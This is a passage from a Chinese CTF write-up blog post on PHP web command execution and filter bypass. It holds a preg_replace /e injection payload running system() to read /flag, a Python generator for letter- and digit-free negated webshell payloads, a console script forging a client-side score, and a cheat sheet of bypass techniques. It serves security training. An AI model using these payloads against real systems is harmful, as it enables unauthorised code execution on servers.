+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?re=.*&amp;str=$&#123;system($_GET[cmd])&#125;&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里有个经典的坑：为什么 Payload 里不能加分号？</strong></p>
+<ul>
+<li>正常 <code>system(&#39;ls&#39;);</code> 是一句”完整句子”，分号 <code>;</code> 是句号，需要它来结束</li>
+<li>但这里是”填空题”：<code>system(...)</code> 是被包裹在双引号字符串 <code>{${ }}</code> 结构里的。PHP 期待的是一个能得出结果的”短语”，而不是完整的”句子”</li>
+<li>加分号写成 <code>{${system($_GET[cmd]);}}</code>，就相当于在填空题格子里硬塞句号，直接抛语法错误</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;170689cd-e76f-4e0e-a2be-f0c77b402f8d&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-7-ezcmd-14：无字母数字-WebShell（取反）"><a href="#3-7-ezcmd-14：无字母数字-WebShell（取反）" class="headerlink" title="3.7 ezcmd_14：无字母数字 WebShell（取反）"></a>3.7 ezcmd_14：无字母数字 WebShell（取反）</h3><p>终极关卡：无字母数字 WebShell。利用 PHP 对字符串取反（<code>~</code>）构造函数名和参数。</p>
+<p><strong>生成脚本：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将输入字符串转换为无字母数字的取反 Payload 格式</span></span><br><span class="line"><span class="string">    例如: &#x27;ls&#x27; -&gt; (~%93%8C)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="comment"># ord(char) 拿到ASCII码</span></span><br><span class="line">        <span class="comment"># 255 - ord(char) 模拟 PHP 的 8位按位取反</span></span><br><span class="line">        <span class="comment"># &#123;:02X&#125; 格式化为两位大写十六进制</span></span><br><span class="line">        negated_hex = <span class="string">&quot;&#123;:02X&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">255</span> - <span class="built_in">ord</span>(char))</span><br><span class="line">        result += <span class="string">f&quot;%<span class="subst">&#123;negated_hex&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;(~<span class="subst">&#123;result&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 你想要执行的函数和参数</span></span><br><span class="line">    func = <span class="string">&quot;system&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    <span class="comment"># 拼装成 PHP 可执行格式: (~函数)(~参数);</span></span><br><span class="line">    final_payload = <span class="string">f&quot;<span class="subst">&#123;make_payload(func)&#125;</span><span class="subst">&#123;make_payload(cmd)&#125;</span>;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 目标函数: <span class="subst">&#123;func&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 执行命令: <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 生成的 Payload:\n<span class="subst">&#123;final_payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a1238253-3a62-4872-b044-1b14d974fb28&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、basic-系列：前端逻辑绕过"><a href="#四、basic-系列：前端逻辑绕过" class="headerlink" title="四、basic 系列：前端逻辑绕过"></a>四、basic 系列：前端逻辑绕过</h2><h3 id="4-1-basic-2：把-admin-改为-1"><a href="#4-1-basic-2：把-admin-改为-1" class="headerlink" title="4.1 basic_2：把 admin 改为 1"></a>4.1 basic_2：把 admin 改为 1</h3><p><code>admin</code> 无论提交什么都等于 0，直接把它的值改成 1 即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ac885622-0987-4404-a4af-5c2fee5a9c34&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-basic-3：复制-JS-到控制台"><a href="#4-2-basic-3：复制-JS-到控制台" class="headerlink" title="4.2 basic_3：复制 JS 到控制台"></a>4.2 basic_3：复制 JS 到控制台</h3><p>把 <code>key.js</code> 复制到浏览器控制台运行，得到密码。</p>
+<h3 id="4-3-basic-5：前端加密不可信，伪造积分"><a href="#4-3-basic-5：前端加密不可信，伪造积分" class="headerlink" title="4.3 basic_5：前端加密不可信，伪造积分"></a>4.3 basic_5：前端加密不可信，伪造积分</h3><p>核心逻辑：<strong>积分 <code>currentScore</code> 的计算完全在前端（浏览器）进行</strong>，服务器只看最后提交的 <code>score</code>。虽然用时调用了 <code>encryptData</code> 加密（本质是 Base64 + URL 编码），且加密解密函数都在前端全局可见——所以完全可以伪造！</p>
+<p><strong>解题脚本（控制台运行）：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接调用页面原本的加密函数，伪造 1000 积分发送给后端</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/claim&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">data</span>: <span class="title function_">encryptData</span>(&#123; <span class="attr">score</span>: <span class="number">1000</span> &#125;) &#125;),</span><br><span class="line">&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (res.<span class="property">data</span>) &#123;</span><br><span class="line">      <span class="comment">// 调用页面原本的解密函数查看结果</span></span><br><span class="line">      <span class="keyword">const</span> result = <span class="title function_">decryptData</span>(res.<span class="property">data</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🎉 成功拿到 Flag: &quot;</span>, result);</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;Flag是: \n&quot;</span> + result.<span class="property">flag</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;❌ 请求失败或未返回数据: &quot;</span>, res);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;发生错误: &quot;</span>, err));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;25c7df77-f1e1-4b44-a73d-8aded0ccda1d&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、命令执行绕过思路速查表"><a href="#五、命令执行绕过思路速查表" class="headerlink" title="五、命令执行绕过思路速查表"></a>五、命令执行绕过思路速查表</h2><table>
+<thead>
+<tr>
+<th>限制</th>
+<th>绕过手段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>无过滤</td>
+<td>直接 <code>;</code>、&#96;</td>
+</tr>
+<tr>
+<td>过滤空格</td>
+<td><code>&lt;</code>、<code>${IFS}</code>、<code>$IFS$9</code>、<code>cat&lt;/flag</code></td>
+</tr>
+<tr>
+<td>过滤分号</td>
+<td><code>?&gt;</code> 闭合、换行 <code>%0a</code></td>
+</tr>
+<tr>
+<td>过滤 <code>system</code></td>
+<td><code>passthru</code>&#x2F;<code>exec</code>&#x2F;<code>shell_exec</code>&#x2F;反引号</td>
+</tr>
+<tr>
+<td>过滤 <code>flag</code></td>
+<td>通配符 <code>f*</code>、<code>fla?</code>、字符拼接 <code>a=fl;b=ag</code></td>
+</tr>
+<tr>
+<td>禁用字母</td>
+<td>八进制 <code>$&#39;\143\141\164&#39;</code>、取反 <code>(~...)</code>、异或</td>
+</tr>
+<tr>
+<td>无回显</td>
+<td><code>system</code>&#x2F;<code>print_r</code> 主动输出</td>
+</tr>
+<tr>
+<td><code>escapeshellcmd</code></td>
+<td>单条完整命令、<code>eval</code> 二次解析</td>
+</tr>
+<tr>
+<td><code>/e</code> 修饰符</td>
+<td><code>{${system(...)}}</code> 变量解析执行</td>
+</tr>
+<tr>
+<td>前端加密</td>
+<td>调用其 <code>encryptData</code> 伪造数据</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>这一整套 ezcmd 题目把命令执行的绕过手法从易到难串得非常完整，核心思想就一件事：</p>
+<blockquote>
+<p><strong>任何”看似过滤”都想办法找它的盲区</strong>——不过滤空格就抓空格，不过滤参数就偷渡参数，不会过滤二次解析就利用二次解析。</p>
+</blockquote>
+<p>刷 Web 命令执行，<strong>先看过滤了什么，再想它没过滤什么</strong>。把上面速查表的思路都过一遍，大部分 RCE 题都能拿下。</p>
+<p><strong>会找盲区，命令执行随手即来。</strong></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>Web命令执行与绕过实战：从ezcmd到无字母数字Shell</p><p><a href="https://pluto839.github.io/Myblog/2026/09/16/Web命令执行与绕过实战：从ezcmd到无字母数字Shell/">https://pluto839.github.io/Myblog/2026/09/16/Web命令执行与绕过实战：从ezcmd到无字母数字Shell/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>Pluto</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2026-09-16</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2026-09-15</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="" rel="noopener" target="_blank" title="知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/RCE/">RCE</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/%E7%BB%95%E8%BF%87/">绕过</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/PHP/">PHP</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/">无字母数字</a><a class="link-muted mr-2" rel="tag" href="/Myblog/tags/WebShell/">WebShell</a></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><div class="social-share"></div><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/Myblog/2026/09/16/CTF%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%EF%BC%9AIDA%E4%BB%8E%E5%AE%89%E8%A3%85%E5%88%B0%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">CTF逆向刷题入门指南：IDA从安装到动态调试</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/Myblog/2026/09/15/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E8%A7%A3%E5%AF%86%EF%BC%9A%E4%BB%8EMD5%E5%88%B0%E5%9B%BD%E5%AF%86SM4/"><span class="level-item">常见加密算法原理解密：从MD5到国密SM4</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><script src="https://giscus.app/client.js" repo="pluto839/Myblog" data-repo="pluto839/Myblog" data-repo-id="R_kgDOTyPc2A" data-category-id="DIC_kwDOTyPc2M4DC8BO" data-category="Announcements" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="noborder_light" data-lang="zh-CN" crossorigin="anonymous" async></script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/Myblog/img/avatar.jpg" alt="Pluto"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Pluto</p><p class="is-size-6 is-block">Hack the planet</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Cyberspace</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/Myblog/archives/"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/Myblog/categories/"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/Myblog/tags/"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/pluto839" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="GitHub" href="https://github.com/pluto839"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/Myblog/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Icarus</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3"><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/Myblog/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/Myblog/categories/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">Web渗透测试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/Myblog/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"><span class="level-start"><span class="level-item">密码学</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/Myblog/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/"><span class="level-start"><span class="level-item">技术笔记</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/Myblog/tags/AES/"><span class="tag">AES</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/Base64/"><span class="tag">Base64</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/CDN%E7%BB%95%E8%BF%87/"><span class="tag">CDN绕过</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/CTF/"><span class="tag">CTF</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/DES/"><span class="tag">DES</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/GitHub-Pages/"><span class="tag">GitHub Pages</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/Hexo/"><span class="tag">Hexo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/IDA/"><span class="tag">IDA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/Icarus/"><span class="tag">Icarus</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/MD5/"><span class="tag">MD5</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/RCE/"><span class="tag">RCE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/RSA/"><span class="tag">RSA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/SHA/"><span class="tag">SHA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/SM2/"><span class="tag">SM2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/SM4/"><span class="tag">SM4</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/TEA/"><span class="tag">TEA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/UPX/"><span class="tag">UPX</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/WebShell/"><span class="tag">WebShell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/Web%E5%AE%89%E5%85%A8/"><span class="tag">Web安全</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/XOR/"><span class="tag">XOR</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><span class="tag">信息收集</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"><span class="tag">加密算法</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"><span class="tag">动态调试</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"><span class="tag">博客搭建</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span class="tag">命令执行</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%9B%BD%E5%AF%86/"><span class="tag">国密</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/"><span class="tag">子域名枚举</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"><span class="tag">密码学</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E5%BB%BA%E7%AB%99/"><span class="tag">建站</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E6%89%93%E7%82%B9/"><span class="tag">打点</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"><span class="tag">指纹识别</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97/"><span class="tag">无字母数字</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E7%BB%95%E8%BF%87/"><span class="tag">绕过</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E8%84%B1%E5%A3%B3/"><span class="tag">脱壳</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/Myblog/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"><span class="tag">逆向工程</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/Myblog/archives/2026/09/"><span class="level-start"><span class="level-item">九月 2026</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/Myblog/archives/2026/08/"><span class="level-start"><span class="level-item">八月 2026</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-09-16T02:00:00.000Z">2026-09-16</time></p><p class="title"><a href="/Myblog/2026/09/16/CTF%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%EF%BC%9AIDA%E4%BB%8E%E5%AE%89%E8%A3%85%E5%88%B0%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">CTF逆向刷题入门指南：IDA从安装到动态调试</a></p><p class="categories"><a href="/Myblog/categories/CTF/">CTF</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-09-16T01:00:00.000Z">2026-09-16</time></p><p class="title"><a href="/Myblog/2026/09/16/Web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98%EF%BC%9A%E4%BB%8Eezcmd%E5%88%B0%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97Shell/">Web命令执行与绕过实战：从ezcmd到无字母数字Shell</a></p><p class="categories"><a href="/Myblog/categories/CTF/">CTF</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-09-15T12:00:00.000Z">2026-09-15</time></p><p class="title"><a href="/Myblog/2026/09/15/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E8%A7%A3%E5%AF%86%EF%BC%9A%E4%BB%8EMD5%E5%88%B0%E5%9B%BD%E5%AF%86SM4/">常见加密算法原理解密：从MD5到国密SM4</a></p><p class="categories"><a href="/Myblog/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-08-09T02:00:00.000Z">2026-08-09</time></p><p class="title"><a href="/Myblog/2026/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97/">Web渗透测试信息收集完全指南：从入门到实战</a></p><p class="categories"><a href="/Myblog/categories/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web渗透测试</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2026-08-08T15:40:00.000Z">2026-08-08</time></p><p class="title"><a href="/Myblog/2026/08/08/%E4%BB%8E%E9%9B%B6%E6%90%AD%E5%BB%BA%E6%9E%81%E5%AE%A2%E5%8D%9A%E5%AE%A2%EF%BC%9A%E7%94%A8-Hexo-%E6%89%93%E9%80%A0%E4%B8%AA%E4%BA%BA%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0%E7%AB%99/">从零搭建极客博客：用 Hexo 打造个人技术笔记站</a></p><p class="categories"><a href="/Myblog/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/">技术笔记</a></p></div></article></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/Myblog/">Pluto&#039;s Notes</a><p class="is-size-7"><span>&copy; 2026 Pluto</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Share Alike" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><i class="fab fa-creative-commons-sa"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/Myblog/js/column.js"></script><script src="/Myblog/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/Myblog/js/back_to_top.js" defer></script><!--!--><script data-pjax src="/Myblog/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/Myblog/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/Myblog/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script><!-- hexo injector body_end start -->
+<div class="pluto-scene">
+  <div class="cloud"></div>
+  <div class="cloud"></div>
+  <div class="cloud"></div>
+  <div class="cloud"></div>
